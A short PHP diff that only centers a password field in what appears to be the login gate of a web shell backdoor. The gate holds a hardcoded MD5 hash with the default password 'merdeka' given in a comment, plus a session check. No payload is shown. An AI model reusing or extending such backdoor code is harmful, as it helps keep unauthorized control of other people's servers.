@@ -31,7 +31,7 @@ $passwd_1945 = "f509e5b1aa24c8222241883261555ed5"; // default password ; merdeka
 $session_name = md5($_SERVER['HTTP_HOST']."_session_1945"); // session name
 function login_1945_merdekaataoemati()
 {
-	echo "<form method=\"POST\"><input type=\"password\" name=\"passwd_1945\"></form>";
+	echo "<form method=\"POST\"><center><input type=\"password\" name=\"passwd_1945\"></center></form>";
 exit;
 }
 if(!isset($_SESSION[$session_name])){if(empty($passwd_1945)||(isset($_POST['passwd_1945'])&&(md5($_POST['passwd_1945']))==$passwd_1945)){$_SESSION[$session_name]=true;}else{login_1945_merdekaataoemati();}}
